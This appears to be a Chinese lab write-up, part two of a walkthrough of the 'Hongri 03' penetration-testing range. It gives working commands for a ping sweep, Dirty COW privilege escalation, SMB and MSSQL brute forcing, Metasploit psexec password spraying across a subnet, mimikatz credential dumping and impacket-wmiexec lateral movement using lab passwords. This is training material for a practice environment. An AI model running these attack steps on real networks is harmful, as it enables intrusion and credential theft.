0x00 前情提要

内网渗透 | 正向代理与nginx反向代理详解

红日靶场03详解（上）

接着上篇文章说起，我们发现获得的是一台内网被反向代理的机器的webshell，接下来如何操作？

0x01 反向代理突破

反向代理突破就是要想尽办法获取到边界机的shell，随后以此为跳板进行内网渗透，之前获取的webshell机器就可以暂时不用去管了。我们的渗透重点以及之后的内网渗透操作就要转移到边界机上了。

那么我先进行一下内网探测，于是切换到tmp目录下，上传一个shell脚本来探测。结果在发现了个mysql文件夹，里面有一个txt文件，先不去管它。

我先进行一下内网探测，看一下存在的语言环境

还是决定写shell脚本吧，接下来创建脚本文件ping.sh填写一下内容：

 #! /bin/sh  ip='192.168.93' #要探测的网段  for i in `seq 1 255`   do    {     ping -c 3 $ip.$i >/dev/null 2>&1     if [ $? -eq 0 ];then      echo $ip.$i UP     else      echo $ip.$i DOWN    fi }& done wait

到目前为止，我们的攻击路线图以及简单的拓扑环境探测就是这样子

由于之前我们扫出来了边界机器存在22端口，又在刚才获得了一个账号密码，所以可以尝试连接它。

注意这里有一个坑点，kali默认ssh连接不上，主要原因是 OpenSSH 7.0 以后的版本不再支持 ssh-dss (DSA)算法

解决方法一：执行 ssh 指令时增加参数

ssh -oHostKeyAlgorithms=+ssh-dss user@legacyhost# user@ip 替换成想要链接的用户名以及ip

此方法有可能无法解决，就是尽管连接了，输入密码怎么也连不上。

解决方法二：手动添加连接配置（推荐）

添加 HostKeyAlgorithms +ssh-dss 到配置 ~/.ssh/config(新建)：

Host somehost.example.orgHostKeyAlgorithms +ssh-dss

其中的 somehost.example.org 替换成自己的域名或IP，连接成功，并且输出$PS1有值，输出$-有字母i，所以是一个交互式shell

解决方法三：用shell连接工具

例如finalshell、x-shell等工具


0x02 边界机提权

红日3这台边界机不需要提权。ssh连接的用户权限已经够了。

首先要知道为什么要提权？有了高权限我们可以做一些敏感操作，例如：

1、添加管理员账户

2、关闭防火墙或低敏操作——放行某端口或协议

3、开启3389进行远程链接

4、hash或明文抓取

5、启动yum或apt远程安装文件

还有很多，要视情况而定，我们一开始的官方提示说，内网域控存在一个机密文件，需要我们去拿到。

由于提权风险较大，到了这一步要谨慎思考是否要提权。而我们现在获取的边界机，仅仅是一个跳板，为了降低风险、减少被发现的可能，这里不需要提权。在ssh连接边界机后完全可以直接远程下载木马上线，随后配置隧道代理进行内网渗透即可。

如果非要提权，在这里我尝试了最近曝出来的提权都失败，还有suid、sudo、数据库提权也不行，这里使用脏牛提权成功。实战环境下如果这个边界机可以访问到github，直接github下载也是可以的。

git clone https://github.com/firefart/dirtycow.gitgcc -pthread dirty.c -o dirty -lcrypt./dirty 123456rm -rf /tmp/passwd.bak./dirty 123456id

提权后我们就能看到，centos机器确实是做了一个反向代理。也可以使用反向代理的nginx -t等命令来检查。

0x04 横向路线思路绘制

综合上面的信息，可以考虑使用下面的方法进行渗透

1、445永恒之蓝

尝试了一下，windows2008和windows7都不存在永恒之蓝

2、445账号密码爆破

我们在使用net use \\1.1.1.1链接某台机器的时候，会让我们输入账号密码，所以445之类的爆破就是基于此。

一旦我们获取到密码，可以直接进行内网的密码喷洒横向渗透。

 use auxiliary/scanner/smb/smb_login options set RHOSTS 192.168.93.10 set pass_file /home/sss/Desktop/pass.txt set smbuser administrator set threads 10 run

windows2012R2 192.168.93.10爆破失败

windows2008R2 192.168.93.20爆破成功，密码为123qwe!ASD

windows7 192.168.93.30爆破成功，密码为123qwe!ASD

奇葩的是，hydra可以代理外链可以进行爆破

3、NTLM中继攻击

中间人攻击的一种，简单讲，SMB、HTTP、LDAP、MSSQL等等协议都可以携带NTLM认证的三类消息如Net-NTLMhash，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击。这里的环境存在SMB，所以可以尝试一下。

利用这个工具：https://github.com/SpiderLabs/Responder

我这里没有复现成功，代理有问题，可以参考这位大神的：https://blog.csdn.net/weixin_46684578/article/details/118685782

4、mssql爆破，成功后可以尝试进行命令执行

use auxiliary/scanner/mssql/mssql_loginoptionsset pass_file /home/sss/Desktop/pass.txtset rhosts 192.168.93.20set threads 10run

爆破失败，密码过于复杂。。

随后可以用msf的mssql命令执行模块，但是失败了。

use admin/mssql/mssql_execoptionsset rhosts 192.168.93.20set password testuser:cvcvgjASD!@run

0x07 横向渗透

得知了域成员机器的本地账号密码，内网windows机器之间的远程链接，要么通过3389开一个屏幕，要么就是通过ipc连接。那么kali如何不使用3389这种图形化远程链接一台windows机器呢？那必然就是通过445远程链接了，这里介绍三种横向手段。

方法一：impacket横向

经典的impacket套装，这个有exe的，也有python的，封装在了kali机器里面，这里使用wmiexec如下。

注意密码中的感叹号在shell编程中为取反，需要转义。

多说一句，其实利用psexec等也可以远程登录，但不推荐，因为wmi是系统白名单，很多杀软不用刻意拦截此工具


方法二：msf psexec密码喷洒

除了上面的方法，也可以用msf的smb/psexec来密码喷洒。

这个靶场环境只有三台windows机器，可以一个一个尝试，但是如果一个内网环境几百台，就改成网段喷洒即可。

 use exploit/windows/smb/psexec set payload windows/x64/meterpreter/bind_tcp set RHOSTS 192.168.93.0/24 set SMBUser administrator set SMBPass 123qwe!ASD run

可以看到20、30已经上线

方法三：传输木马上线

这里就有两种方式传输msf木马：通过获得的终端，开启3389，上传；也可以让内网机器远程下载边界机木马。注意msf生成的木马是正向的，因为目标机器和kali机器并不能互通。

0x06 域控明文密码获取

后面就比较简单了，向边界机上传mimikatz，然后域成员机器远程下载并运行就可以获取到域控的明文密码。

或者直接用msf获取到的session，进入后执行下面的命令

meterpreter>load kiwimeterpreter>kiwi_cmd privilege::debugmeterpreter>kiwi_cmd sekurlsa::logonPasswords

如果报错，因为当前是32位的进程无法运行mimikatz，直接将当前进程迁移到一个64位的进程中就可以了。

获取到TEST.ORG的administrator密码即域控密码，以及windows2008本地的管理员密码123qwe!ASD

随后使用同样的三种方式横向过去即可，只不过这里msf的psexec需要配置一下域环境，不过msf的失败了。

 use exploit/windows/smb/psexec set payload windows/x64/smb/psexec set rhosts 192.168.93.10 set SMBDomain TEST set SMBUser administrator set SMBPass zxcASDqw123!! set rhost 192.168.93.10

那么试试wmiexec横向，下面两条命令都可以，成功找到flag

proxychains impacket-wmiexec TEST/administrator:zxcASDqw123\!\!@192.168.93.10proxychains impacket-wmiexec administrator:zxcASDqw123\!\!@192.168.93.10
